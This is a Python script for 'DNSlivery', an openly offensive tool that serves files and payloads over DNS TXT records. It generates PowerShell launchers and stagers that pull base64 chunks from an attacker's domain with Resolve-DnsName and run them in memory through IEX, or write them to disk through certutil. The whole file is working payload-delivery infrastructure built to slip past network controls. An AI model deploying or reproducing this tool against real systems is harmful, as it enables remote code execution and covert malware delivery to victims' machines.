#! /usr/bin/env python3

import sys
import os
import argparse
import signal
import re
import base64
from scapy.all import *

banner = """
DNSlivery - Easy files and payloads delivery over DNS
"""

def log(message, msg_type = ''):
    reset   = '\033[0;m'

    # set default prefix and color
    prefix  = '[*]'
    color   = reset

    # change prefix and color based on msg_type
    if msg_type == '+':
        prefix  = '[+]'
        color   = '\033[1;32m'
    elif msg_type == '-':
        prefix  = '[-]'
        color   = '\033[1;31m'
    elif msg_type == 'debug':
        prefix  = '[DEBUG]'
        color   = '\033[0;33m'

    print('%s%s %s%s' % (color, prefix, message, reset))

def base64_chunks(clear, size):
    encoded = base64.b64encode(clear)

    # split base64 into chunks of provided size
    encoded_chunks = []
    for i in range(0, len(encoded), size):
        encoded_chunks.append(encoded[i:i + size])

    return encoded_chunks

def signal_handler(signal, frame):
    log('Exiting...')
    sys.exit(0)

def dns_handler(data):
    # only process dns queries
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        # split packet layers
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        if len(dnsqr.qname) <= 0:
            log('Received DNS query but qname was empty?', '-')
            return
     
        if dnsqr.qtype == 1 or dnsqr.qtype == 28:
            # a queries (type 1) and aaaa queries (type 28)
            
            if args.verbose: 
                log('[A] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src)) if dnsqr.qtype == 1 else log('[AAAA] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
 
            # build response packet
            rcode = 0
            dn = args.domain
            t = 'A' if dnsqr.qtype == 1 else 'AAAA'
            rdata = '127.0.0.1' if dnsqr.qtype == 1 else '::1'
            an = (None, DNSRR(rrname=dnsqr.qname, type=t, rdata=rdata, ttl=1))[rcode == 0]
            ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)
            log('Delivering %s to %s' % (rdata, ip.src), '+')

            response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
            send(response_pkt, verbose=0, iface=args.interface)
        elif dnsqr.qtype == 16:
            # txt queries (type 16)
            if args.verbose: log('[TXT] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))

            # remove domain part of fqdn and split the different parts of hostname
            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode().lower()).split('.')

            # check if hostname match existing file 
            if len(hostname) > 0 and hostname[0] in chunks:
                
                # launcher response (default): file.domain
                if len(hostname) == 1: hostname.append('print')

                # launcher response: file.stager.domain
                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save', 'clm']:
                    if hostname[1] == 'clm':
                        sanitized = hostname[0]
                        filename = [key for key,value in filenames.items() if value == hostname[0]][0]
                        tempfile = filename+".b64"

                        log('Delivering %s %s stager to %s' % (hostname[0], hostname[1], ip.src), '+')
                        #log('  %s, %s'%(filename, tempfile))
                        response = clm_template % (len(chunks[hostname[0]]), len(chunks[hostname[0]]), hostname[0], args.domain, tempfile, tempfile, filename)
                    else:
                        response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], args.domain)
                        log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')

                # stager response: file.stager.i.domain
                elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
                    response = stagers[hostname[0]][hostname[1]][int(hostname[2])-1]
                    log('Delivering %s %s stager %s/%d to %s' % (hostname[0], hostname[1], int(hostname[2]), len(stagers[hostname[0]][hostname[1]]), ip.src), '+')

                # base64 chunk response: file.i
                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) > 0 and int(hostname[1]) <= len(chunks[hostname[0]]):
                    response = chunks[hostname[0]][int(hostname[1])-1]
                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')

                else: return

                # build response packet
                rdata = response
                rcode = 0
                dn = args.domain
                an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)

                response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                send(response_pkt, verbose=0, iface=args.interface)
        else:
            # any other query
            if args.verbose: log('[type %s] Received DNS query for %s from %s' % (dnsqr.qtype, dnsqr.qname.decode(), ip.src))
            return

if __name__ == '__main__':
    # parse args
    parser = argparse.ArgumentParser(description = banner)
    parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
    parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
    parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
    parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
    parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
    args = parser.parse_args()

    print('%s' % banner)

    # verify root
    if os.geteuid() != 0:
        log('Script needs to be run with root privileges to listen for incoming udp/53 packets', '-')
        sys.exit(-1)

    # verify path exists and is readable
    abspath = os.path.abspath(args.path)
    
    if not os.path.exists(abspath) or not os.path.isdir(abspath):
        log('Path %s does not exist or is not a directory' % abspath, '-')
        sys.exit(-1)

    # list files in path
    filenames = {}
    for root, dirs, files in os.walk(abspath):
        for name in files:
            filenames[name] = ''
        break

    # launcher and stagers template definition
    launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'

    # Template for environments with contrained languge mode enabled
    clm_template = '((1..%d|%%{Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Select -Exp Strings}) -join "") > %s; certutil -decode %s %s'# rm %s

    stager_templates = {
        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
    }

    # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
    chunks = {}
    stagers = {}

    for name in filenames:
        # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
        sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
        sanitized = sanitized.lower()                       # lower all chars
        sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
        filenames[name] = sanitized

        # verify args.size is decimal
        if not args.size.isdecimal():
            log('Incorrect size value for base64 chunks', '-')
            sys.exit(-1)

        size = int(args.size)

        try:
            # compute base64 chunks of files
            with open(os.path.join(abspath, name), 'rb') as f: chunks[filenames[name]] = base64_chunks(f.read(), size)

        except:
            # remove key from dict in case of failure (e.g. file permissions)
            del filenames[name]
            log('Error computing base64 for %s, file will been ignored' % name, '-')
            break

        # generate stagers
        stagers[filenames[name]] = {}
        stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
        stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
        stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)

        # display file ready for delivery
        log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))

    # register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # listen for DNS query
    log('Listening for DNS queries...')

    udpserver = socket. socket(socket.AF_INET, socket.SOCK_DGRAM)  
    udpserver.bind(('0.0.0.0',53)) #listen to 53 port

    while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)